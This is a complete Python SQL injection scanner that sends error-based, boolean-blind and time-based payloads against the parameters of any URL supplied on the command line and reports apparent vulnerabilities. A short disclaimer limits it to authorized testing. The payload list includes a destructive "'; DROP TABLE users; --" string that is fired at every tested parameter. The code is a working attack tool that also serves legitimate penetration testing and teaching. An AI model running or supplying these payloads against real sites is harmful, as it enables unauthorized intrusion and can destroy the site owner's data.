"""
SQL Injection Vulnerability Checker
------------------------------------
⚠️  For educational purposes and authorized testing ONLY.
    Do not use against websites you don't own or have permission to test.
"""

import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import sys
import time

# ── Payloads ────────────────────────────────────────────────────────────────

ERROR_PAYLOADS = [
    "'",
    "''",
    "`",
    '"',
    "' OR '1'='1",
    "' OR 1=1 --",
    '" OR 1=1 --',
    "' OR 'x'='x",
    "') OR ('1'='1",
    "'; DROP TABLE users; --",
]

BOOLEAN_PAIRS = [
    ("' AND 1=1 --", "' AND 1=2 --"),
    (" AND 1=1",     " AND 1=2"),
    ("' AND 'a'='a", "' AND 'a'='b"),
]

TIME_PAYLOADS = [
    "'; WAITFOR DELAY '0:0:5' --",          # MSSQL
    "'; SELECT SLEEP(5) --",                 # MySQL
    "' OR SLEEP(5) --",                      # MySQL
    "'; SELECT pg_sleep(5) --",              # PostgreSQL
    "1; SELECT SLEEP(5)",
]

# Common SQL error signatures
ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlstate",
    "ora-",
    "microsoft ole db provider for sql server",
    "odbc sql server driver",
    "postgresql error",
    "pg::syntaxerror",
    "sqlite_error",
    "syntax error",
    "mysql_fetch",
    "supplied argument is not a valid mysql",
]

# ── Helpers ──────────────────────────────────────────────────────────────────

def get_params(url):
    """Extract query parameters from a URL."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    return parsed, params

def build_url(parsed, params):
    """Rebuild URL with modified params."""
    query = urlencode({k: v[0] for k, v in params.items()})
    return urlunparse(parsed._replace(query=query))

def fetch(url, timeout=10):
    """GET a URL, return (response_text, status_code, elapsed_seconds) or None."""
    try:
        headers = {"User-Agent": "Mozilla/5.0 (SQLi-Checker/1.0)"}
        r = requests.get(url, headers=headers, timeout=timeout, allow_redirects=True)
        return r.text.lower(), r.status_code, r.elapsed.total_seconds()
    except requests.exceptions.RequestException as e:
        print(f"  [!] Request failed: {e}")
        return None, None, None

def has_sql_error(response_text):
    """Check if response contains known SQL error strings."""
    if not response_text:
        return False
    return any(sig in response_text for sig in ERROR_SIGNATURES)

def print_result(vuln_type, param, payload, detail=""):
    print(f"\n  🚨  VULNERABLE  [{vuln_type}]")
    print(f"      Parameter : {param}")
    print(f"      Payload   : {payload}")
    if detail:
        print(f"      Detail    : {detail}")

# ── Test functions ────────────────────────────────────────────────────────────

def test_error_based(parsed, params):
    """Inject error-triggering payloads and watch for SQL error messages."""
    print("\n[1] Error-Based SQLi")
    found = False
    for param in params:
        for payload in ERROR_PAYLOADS:
            modified = dict(params)
            modified[param] = [params[param][0] + payload]
            test_url = build_url(parsed, modified)
            text, status, _ = fetch(test_url)
            if text and has_sql_error(text):
                print_result("Error-Based", param, payload, "SQL error message in response")
                found = True
                break  # one hit per param is enough
    if not found:
        print("   No error-based SQLi detected.")
    return found

def test_boolean_based(parsed, params):
    """Compare true vs false condition responses."""
    print("\n[2] Boolean-Based Blind SQLi")
    found = False
    for param in params:
        original_val = params[param][0]
        for true_payload, false_payload in BOOLEAN_PAIRS:
            mod_true  = dict(params); mod_true[param]  = [original_val + true_payload]
            mod_false = dict(params); mod_false[param] = [original_val + false_payload]

            text_true,  _, _ = fetch(build_url(parsed, mod_true))
            text_false, _, _ = fetch(build_url(parsed, mod_false))

            if text_true is None or text_false is None:
                continue

            # Significant length difference suggests different DB results
            len_diff = abs(len(text_true) - len(text_false))
            if len_diff > 50:
                print_result(
                    "Boolean-Based Blind", param,
                    f"TRUE: {true_payload}  /  FALSE: {false_payload}",
                    f"Response length differs by {len_diff} chars"
                )
                found = True
                break
    if not found:
        print("   No boolean-based SQLi detected.")
    return found

def test_time_based(parsed, params, threshold=4.0):
    """Inject time-delay payloads and measure response time."""
    print("\n[3] Time-Based Blind SQLi")
    found = False

    # Baseline timing
    baseline_url = build_url(parsed, params)
    _, _, baseline_time = fetch(baseline_url)
    if baseline_time is None:
        print("   Baseline request failed, skipping time-based test.")
        return False
    print(f"   Baseline response time: {baseline_time:.2f}s")

    for param in params:
        for payload in TIME_PAYLOADS:
            modified = dict(params)
            modified[param] = [params[param][0] + payload]
            test_url = build_url(parsed, modified)
            _, _, elapsed = fetch(test_url, timeout=15)
            if elapsed and elapsed >= threshold:
                print_result(
                    "Time-Based Blind", param, payload,
                    f"Response delayed {elapsed:.2f}s (baseline {baseline_time:.2f}s)"
                )
                found = True
                break
    if not found:
        print("   No time-based SQLi detected.")
    return found

# ── Main ──────────────────────────────────────────────────────────────────────

def scan(url):
    print("=" * 60)
    print(f"  SQL Injection Checker")
    print(f"  Target : {url}")
    print("=" * 60)

    parsed, params = get_params(url)
    if not params:
        print("\n⚠️  No query parameters found in URL.")
        print("   Try appending a parameter, e.g.:")
        print(f"   {url}?id=1")
        return

    print(f"\n  Parameters found: {list(params.keys())}")

    results = []
    results.append(test_error_based(parsed, params))
    results.append(test_boolean_based(parsed, params))
    results.append(test_time_based(parsed, params))

    print("\n" + "=" * 60)
    if any(results):
        print("  ⚠️  RESULT: Potential SQL injection vulnerability found!")
        print("     Verify manually and report to the site owner.")
    else:
        print("  ✅  RESULT: No obvious SQLi vulnerabilities detected.")
        print("     Note: This does not guarantee the site is secure.")
    print("=" * 60)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python sqli_checker.py <url>")
        print('Example: python sqli_checker.py "http://testphp.vulnweb.com/artists.php?artist=1"')
        sys.exit(1)

    target = sys.argv[1]
    scan(target)
